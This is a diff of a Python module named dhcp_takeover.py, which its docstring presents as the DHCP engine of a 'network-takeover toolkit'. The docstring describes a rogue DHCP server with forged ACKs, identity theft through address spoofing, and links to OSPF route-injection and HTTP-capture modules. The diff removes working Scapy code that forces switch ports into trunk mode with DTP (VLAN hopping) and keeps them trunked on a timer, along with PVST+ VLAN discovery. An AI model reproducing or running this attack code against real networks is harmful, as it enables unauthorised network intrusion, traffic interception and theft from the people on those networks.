@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
-# v2.0
+# v2.1
 """
 dhcp_takeover.py — DHCP engine for the network-takeover toolkit.
 
 A library module (no orchestration of its own — see main.py).  Provides:
-  - DTP trunk negotiation and PVST+ VLAN discovery
   - DHCPDISCOVER sweeps and DHCPOFFER sniffing
   - static-address / VLAN-subinterface / loopback management for identity theft
   - a rogue DHCP server (OFFER / ACK / NAK / RELEASE) with:
@@ -14,8 +13,10 @@ A library module (no orchestration of its own — see main.py).  Provides:
         VPN-subnet relay (see vpn_relay.py) without duplication
       * optional impersonation of the real server (forged ACKs)
 
-OSPF adjacency forming lives in ospf_adjacency.py; HTTP capture in
-http_intercept.py; VPN relay in vpn_relay.py.  main.py wires them together.
+VLAN/subnet discovery is now done via OSPF Hello sniffing (ospf_adjacency.py).
+OSPF adjacency forming and route injection live in ospf_adjacency.py; HTTP
+capture in http_intercept.py; VPN relay in vpn_relay.py.  main.py wires them
+together.
 """
 import ipaddress
 import platform
@@ -23,19 +24,14 @@ import random
 import shutil
 import socket
 import subprocess
-from threading import Event, Thread
 import time
 
 from scapy.all import (
     BOOTP,
     DHCP,
     Dot1Q,
-    Dot3,
     Ether,
     IP,
-    LLC,
-    SNAP,
-    STP,
     UDP,
     get_if_addr,
     get_if_hwaddr,
@@ -43,7 +39,6 @@ from scapy.all import (
     sendp,
     sniff,
 )
-from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType
 
 DEFAULT_SUBNET_MASK = "255.255.255.0"
 DEFAULT_PREFIX_LENGTH = 24
@@ -51,9 +46,6 @@ DEFAULT_DHCP_LEASE_TIME = 30 * 24 * 60 * 60
 MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
 DEFAULT_DHCP_DISCOVER_VLANS = range(1, 30 + 1)
 DEFAULT_INTERFACE = "eth0"
-PVST_SNIFF_TIMEOUT = 10
-DTP_REFRESH_INTERVAL = 20
-DTP_REFRESH_REPEAT = 3
 INTERFACE_IPV4_WAIT_INTERVAL = 2
 INTERFACE_IPV4_WAIT_TIMEOUT = 60
 DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
@@ -126,148 +118,6 @@ def run_capture_command(description, command):
     print_step("OK", description)
     return result.stdout
 
-
-def build_dtp_type_tlv():
-    try:
-        return DTPType(dtptype=b"\xA5")
-    except AttributeError:
-        print_step("FAIL", "This Scapy DTPType layer does not support dtptype")
-        raise
-
-
-def force_trunk(interface, mac_address="01:00:0C:CC:CC:CC", repeat=10, interval=1):
-    """Send DTP packets to force the switch port into trunk mode."""
-    print_step("START", f"Getting source MAC address for {interface}")
-    source_mac = get_if_hwaddr(interface)
-    print_step("OK", f"Source MAC address for {interface}: {source_mac}")
-
-    print_step("START", f"Building DTP trunk packet for {mac_address} on {interface}")
-    packet = (
-        Dot3(dst=mac_address, src=source_mac) /
-        LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03) /
-        SNAP(OUI=0x00000C, code=0x2004) /
-        DTP(ver=1, tlvlist=[
-            DTPDomain(domain=b""),
-            DTPStatus(status=b"\x03"),
-            build_dtp_type_tlv(),
-        ])
-    )
-
-    print_step("OK", f"Built DTP packet: {packet.summary()}")
-    print_step("START", f"Sending {repeat} DTP trunk packet(s) to {mac_address} on {interface}")
-    for packet_number in range(1, repeat + 1):
-        sendp(packet, iface=interface, verbose=False)
-        print_step("OK", f"Sent DTP trunk packet {packet_number}/{repeat}")
-        if packet_number != repeat:
-            time.sleep(interval)
-    print_step("OK", f"Finished sending DTP trunk packet burst on {interface}")
-
-
-def periodic_dtp_trunking_worker(
-    interface,
-    stop_event,
-    mac_address="01:00:0C:CC:CC:CC",
-    refresh_interval=DTP_REFRESH_INTERVAL,
-    repeat=DTP_REFRESH_REPEAT,
-    packet_interval=1,
-):
-    print_step(
-        "START",
-        f"Periodic DTP trunking refresh started on {interface} every {refresh_interval} second(s)",
-    )
-    while not stop_event.wait(refresh_interval):
-        try:
-            force_trunk(
-                interface,
-                mac_address=mac_address,
-                repeat=repeat,
-                interval=packet_interval,
-            )
-        except Exception as exc:
-            print_step("WARN", f"Periodic DTP trunking refresh failed: {exc}")
-    print_step("OK", f"Periodic DTP trunking refresh stopped on {interface}")
-
-
-def start_periodic_dtp_trunking(
-    interface,
-    mac_address="01:00:0C:CC:CC:CC",
-    refresh_interval=DTP_REFRESH_INTERVAL,
-    repeat=DTP_REFRESH_REPEAT,
-    packet_interval=1,
-):
-    stop_event = Event()
-    thread = Thread(
-        target=periodic_dtp_trunking_worker,
-        args=(interface, stop_event),
-        kwargs={
-            "mac_address": mac_address,
-            "refresh_interval": refresh_interval,
-            "repeat": repeat,
-            "packet_interval": packet_interval,
-        },
-        daemon=True,
-    )
-    thread.start()
-    return stop_event, thread
-
-
-def stop_periodic_dtp_trunking(stop_event, thread, timeout=5):
-    stop_event.set()
-    thread.join(timeout=timeout)
-    if thread.is_alive():
-        print_step("WARN", "Periodic DTP trunking refresh thread did not stop cleanly")
-    else:
-        print_step("OK", "Periodic DTP trunking refresh thread stopped")
-
-
-def countdown(description, seconds):
-    print_step("START", f"{description}: waiting {seconds} second(s)")
-    for remaining in range(seconds, 0, -1):
-        print_step("WAIT", f"{description}: {remaining} second(s) remaining")
-        time.sleep(1)
-    print_step("OK", description)
-
-
-def sniff_pvst(iface="eth0", count=0, timeout=PVST_SNIFF_TIMEOUT):
-    """Sniff for PVST+ BPDUs to discover active VLANs."""
-    network_map = {"vlans": {}}
-
-    def packet_callback(packet):
-        try:
-            if not packet.haslayer(STP) or not packet.haslayer(Dot1Q):
-                return
-            vlan_id = packet[Dot1Q].vlan
-            stp = packet[STP]
-            network_map["vlans"][vlan_id] = {
-                "root_bridge_mac": stp.rootmac,
-                "root_id": stp.rootid,
-                "bridge_mac": stp.bridgemac,
-            }
-            print_step("OK", f"Discovered VLAN {vlan_id} via PVST+")
-        except Exception as exc:
-            print_step("WARN", f"Error processing PVST BPDU: {exc}")
-
-    print_step("START", f"Sniffing for PVST+ BPDUs on {iface} for {timeout} seconds")
-    try:
-        sniff(
-            iface=iface,
-            lfilter=lambda packet: packet.haslayer(STP) and packet.haslayer(Dot1Q),
-            prn=packet_callback,
-            store=False,
-            count=count,
-            timeout=timeout,
-        )
-    except KeyboardInterrupt:
-        pass
-    except Exception as exc:
-        print_step("WARN", f"Error during PVST sniffing: {exc}")
-
-    print_step("OK", f"PVST sniff completed. Discovered {len(network_map['vlans'])} VLAN(s)")
-    return network_map
-
-
-def get_discovered_vlan_ids(network_map):
-    return sorted(network_map.get("vlans", {}).keys())
 
 
 def iter_dhcp_options(packet):
